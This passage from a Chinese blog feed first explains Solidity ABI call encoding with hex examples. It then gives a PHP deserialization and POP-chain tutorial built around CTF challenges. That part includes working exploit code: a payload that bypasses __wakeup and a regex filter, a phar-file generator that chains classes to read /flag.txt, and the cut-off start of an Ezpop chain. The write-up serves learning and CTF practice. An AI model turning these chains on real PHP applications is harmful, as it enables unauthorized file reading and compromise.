编码（这里等同于ASCII编码），并在低位补0到32字节：<code>0x6461766500000000000000000000000000000000000000000000000000000000</code>;</li><li>第三个参数的数据部分以数组元素的个数开始，这里是<code>3</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li><li>第三个参数的第一个数组元素，1：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>;</li><li>第三个参数的第二个数组元素，2：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第三个参数的第三个数组元素，3：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li></ul><p>合起来就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa5643bf20000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000464617665000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003</span><br></pre></td></tr></table></figure></li></ul><h6 id="例3："><a href="#例3：" class="headerlink" title="例3："></a>例3：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function f(uint,uint32[],bytes10,bytes) public pure &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用参数<code>(0x123, [0x456, 0x789], &quot;1234567890&quot;, &quot;Hello, world!&quot;)</code>进行对函数<code>f(uint,uint32[],bytes10,bytes)</code>的调用会通过以下方式进行编码：</p><ul><li>函数选择器：<code>0x8be65246</code>;</li><li>第一个参数 <strong>uint</strong>（静态类型），直接存储其 <strong>data</strong>：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</li><li>第二个参数 **uint32 []*<em>（动态类型），先存储其 offset=0x20</em>4（4个参数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</li><li>第三个参数 <strong>bytes10</strong> (静态类型)，直接存储其 <strong>data</strong>（先转为 <strong>ASCII</strong> 码，从低位开始补充0到32字节）：<code>0x3132333435363738393000000000000000000000000000000000000000000000</code>；</li><li>第四个参数 <strong>bytes</strong> (动态类型)，先存储其 <strong>offset=0x80+3*0x20</strong>=第一个动态参数的<strong>offset</strong> + 第一个动态参数的数据部分的长度 ：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>；</li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li><p>第二个参数的 <strong>length</strong>（两个数组元素）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>；</p></li><li><p>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000456</code>；</p></li><li><p>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000789</code>；</p></li><li><p>第四个参数的 <strong>length</strong>（13 个字节）：<code>0x000000000000000000000000000000000000000000000000000000000000000d</code>；</p></li><li><p>第四个参数的数据部分（需要对 <strong>Hello, World!</strong> 进行编码，如下图）：<code>0x48656c6c6f2c20776f726c642100000000000000000000000000000000000000</code>；</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/6.png" alt="6"></p></li></ul></li><li><p>将结果合在一起：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8be65246</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000123</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000080</span><br><span class="line">  3132333435363738393000000000000000000000000000000000000000000000</span><br><span class="line">  00000000000000000000000000000000000000000000000000000000000000e0</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000002</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000456</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000789</span><br><span class="line">  000000000000000000000000000000000000000000000000000000000000000d</span><br><span class="line">  48656c6c6f2c20776f726c642100000000000000000000000000000000000000 </span><br></pre></td></tr></table></figure></li></ul><h4 id="0x05-ABI函数"><a href="#0x05-ABI函数" class="headerlink" title="0x05 ABI函数"></a>0x05 ABI函数</h4><ul><li><p><code>abi.encodePacked(...) returns (bytes)</code>：对给点参数执行紧打包编码，即</p><ul><li>对函数选择器不进行编码；</li></ul></li><li><p>长度低于32字节的类型，即不会进行补0操作，也不会进行符号扩展；</p><ul><li>动态类型会直接进行编码，并且不包含长度信息。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line">    function AbiEncodePacked() public view returns (bytes memory) &#123;</span><br><span class="line">        bytes memory result  = abi.encodePacked(a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![image-20220423224621777](/Volumes/T7/Blog/Banana69/source/_posts/Solidity Function Selector.assets/image-20220423224621777.png)</p></li><li><p><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)</code>：对给定的第二个参数开始的参数进行编码，并以给定的函数选择器作为起始的4字节数据一起返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line"></span><br><span class="line">    function encodeWithSelector() public  view returns(bytes memory)&#123;</span><br><span class="line">        bytes memory result = abi.encodeWithSelector(this.encodeWithSelector.selector,a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/banana/Documents/image-20220423230914216.png" alt="image-20220423230914216"></p></li><li><p><code>abi.encodeWithSignature(string signature, ...) returns (bytes)</code>:与<code>encodeWithSelector</code>等价</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-Basic-Design&quot;&gt;&lt;a href=&quot;#0x01-Basic-Design&quot; class=&quot;headerlink&quot; title=&quot;0x01 Basic Design&quot;&gt;&lt;/a&gt;0x01 Basic Design&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;AB</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化及POP链构造</title>
    <link href="https://banana69.site/2021/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://banana69.site/2021/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-16T01:24:02.000Z</published>
    <updated>2021-10-17T12:35:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p>php反序列化即所有php中的值都可以使用 serialize() 函数来返回一个包含字节流的字符串来表示，如以下代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>  = <span class="string">&quot;this is a str&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;Bob&quot;</span>,<span class="string">&quot;sex&quot;</span>=&gt;<span class="string">&quot;m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字符串str序列化操作：s:13:&quot;this is a str&quot; s:16表示字符串长度为16</span></span><br><span class="line"><span class="comment">//数组arr序列化操作：a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;sex&quot;;s:1:&quot;m&quot;;&#125;</span></span><br><span class="line"><span class="comment">//类A序列化操作：O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125; O代表对象，A是类名，a是类实例化后的对象名，i是数值型</span></span><br><span class="line"><span class="comment">//类B序列化操作：O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>由于序列化一个对象会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字，所以A和B序列化后的代码除了类名都是相同的。而unserialize()函数就是将序列化后的值返回 <strong>php</strong> 原来的值。</p><ul><li><p>反序列化中的魔术方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//读取不可访问（protected 或 private）或不存在的属性的值时被调用</span></span><br><span class="line">__set()<span class="comment">//在给不可访问（protected 或 private）或不存在的属性赋值时</span></span><br><span class="line">__invoke()<span class="comment">//当以调用函数的方式调用一个对象时会执行</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br><span class="line">__isset()   <span class="comment">//当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>public、protected与private</strong> 区别：</p><ul><li><p><strong>protected：</strong></p><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时字段名前会加上<code>\0*\0</code>的前缀，这里的<code>\0</code>表示 ASCII 码为 0 的字符（不可见字符），不是<code>\0</code>字符串。</p><p>所以在输入反序列化值时需要给保护变量前加上<code>\0*\0</code>，例如：</p><p><code>O:4:&quot;Name&quot;:2:&#123;s:11:&quot;\0*\0username&quot;;s:5:&quot;admin&quot;;s:11:&quot;\0*\0password&quot;;i:100;&#125;</code></p></li><li><p><strong>private：</strong></p><p>private 声明的字段为私有字段，只有其声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前都会加上<code>\0</code>的前缀，字符串长度也包括所加前缀的长度，其中<code>\0</code>字符也是计算长度的，例如：</p><p><code>O:4:&quot;Name&quot;:3：&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;</code></p><p>在浏览器中提交时可以用<code>%00</code>来替换<code>\0</code>，使用 <strong>url</strong> 编码，使用 <strong>PHP</strong> 输出时可以用使用<code>urlencode()</code>函数。</p></li></ul></li></ul><h4 id="0x02-漏洞产生"><a href="#0x02-漏洞产生" class="headerlink" title="0x02 漏洞产生"></a>0x02 漏洞产生</h4><p>当 <strong>serialize()</strong> 函数执行时首先会检查是否存在魔术方法 <code>__sleep()</code>，当该魔术方法存在时会被首先调用，然后才执行序列化操作。而 <code>unserialize()</code> 函数执行时会检查存在一个 <code>__wakeup()</code> 魔术方法，若存在该魔术方法则会先调用 <code>__wakeup()</code>。所以漏洞的根源在于 <code>unserialize()</code> 函数的参数可控。</p><p>例如该代码中存在反序列化漏洞：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：当反序列化时的字符串所对应的对象的数目被修改，<code>__wake()</code> 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如 <strong>__destruct()</strong></p><p>所以针对以上代码构造序列化值：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:4:&quot;111&quot;;&#125;</code>,修改对应的字符串数目即可绕过 <code>wakeup()</code>。</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="1"></p><h4 id="0x02-实践学习"><a href="#0x02-实践学习" class="headerlink" title="0x02 实践学习"></a>0x02 实践学习</h4><h5 id="①-Web-php-unserialize"><a href="#①-Web-php-unserialize" class="headerlink" title="① Web_php_unserialize"></a>① Web_php_unserialize</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;  <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>; <span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; <span class="comment">//wakeup()函数返回index.php，所以必须绕过</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//正则检查</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码分析返回 <strong>fl4g.php</strong> 必须要满足以下条件：</p><ol><li><p>绕过 wakeup() 函数</p><p>当反序列化时的字符串所对应的对象的数目被修改,<code>_wake()</code>的函数就不会被调用。</p></li><li><p>绕过正则表达式</p><p><code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>该正则表达式的意思是若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式被过滤。</p><p>使用<code>O：+4</code>来绕过</p></li><li><p>对序列化的内容进行 <strong>Base64</strong> 加密</p></li></ol><p>由于代码中的 <strong>file</strong> 为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即**%00<strong>），字符串长度也比实际长度大 ，如果将序列化结果复制到在线的 <strong>base64</strong> 网站进行编码可能就会丢掉空白字符，这里直接在</strong>PHP** 代码中实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$A</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$var</span> = serialize(<span class="variable">$A</span>);</span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$var</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$var</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="comment">//O:+4:&quot;Demo&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload：</strong><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h5 id="②-phar-反序列化："><a href="#②-phar-反序列化：" class="headerlink" title="② phar 反序列化："></a>② phar 反序列化：</h5><p><strong>phar</strong> 可以理解为 <strong>php</strong> 压缩文档，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 <strong>php</strong> 访问并执行，与 <code>file://，php://</code>等伪协议类似，也是一种流包装器。</p><p><strong>phar</strong> 由四部分组成：</p><ul><li><strong>stub：</strong> <strong>phar</strong> 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li><li><strong>manifest：</strong>压缩文件的属性等信息，以序列化存储；</li><li><strong>contents：</strong>压缩文件的内容；</li><li><strong>signature：</strong>签名，放在文件末尾。</li></ul><blockquote><p>注意：</p><ol><li>这里的文件标识必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但是之前的内容没有限制，即可以通过伪造一个图片文件或者 pdf 文件来绕过一些上传限制；</li><li>phar 存储的 meta-data 信息以序列化的方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件就会将数据反序列化，可以使用常用函数结合文件伪造，通过<code>phar://</code>伪协议解析造成反序列化攻击，如以下文件操作函数</li></ol></blockquote><table><thead><tr><th>文件操作函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p>例题：[CISCN2019 华北赛区 Day1 Web1]Dropbox</p><p>在登录后有文件上传的功能，在上传文件后可以进行文件删除和文件下载的操作。下载文件操作通过 <strong>POST</strong> 请求传递 <strong>filename</strong> 参数来完成的，这里可以构造参数尝试进行任意文件下载，得到源码</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="2"></p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>继而可以下载到 <strong>class.php，delete.php，download.php</strong>。</p><p>对代码进行分析后， <strong>class.php</strong>的 <strong>File</strong> 类中的 <strong>close</strong> 方法可以读取文件内容；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>User</strong> 类中存在 <strong>close</strong> 方法，当该对象被销毁时会去执行 <strong>close</strong> 方法；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>FileList</strong> 类中存在 <strong>__call</strong> 魔术方法，且该类中不存在 <strong>close</strong> 方法，如果一个 <strong>FileList</strong> 对象掉用了 <strong>close()</strong> 方法，就可以通过 <strong>__call</strong> 方法去执行 <strong>close</strong> 方法；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>); <span class="comment">// 向$this-&gt;funcs数组尾部添加$func</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123; <span class="comment">//遍历数组</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以梳理出解题的思路：</p><ol><li>创建一个 user 对象，其 db 变量是一个 FileList 对象，且对象中的 files 参数为 flag 的位置。</li><li>当 user 对象被销毁时，db 变量的 close 方法会被执行；</li><li>db 变量不存在 close 方法，会触发 FileList 中的 __call 魔术方法，即执行 File 对象中的 close 方法；</li><li>close 方法执行后存在 result 变量的结果会被加入到 table 变量中打印出来。</li></ol><p>生成 phar 文件：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;<span class="meta">&lt;?php</span> __HALT_COMPILER();<span class="meta">?&gt;</span>&#x27;);   </span></span><br><span class="line"><span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过删除功能去利用<code>php://</code>伪协议去解析 <strong>phar</strong> 文件，会将 <strong>meta-data</strong> 进行反序列化：</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt="3"></p><h5 id="③-MRCTF2020-Ezpop（构造-pop链）"><a href="#③-MRCTF2020-Ezpop（构造-pop链）" class="headerlink" title="③ MRCTF2020-Ezpop（构造 pop链）"></a>③ MRCTF2020-Ezpop（构造 pop链）</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span 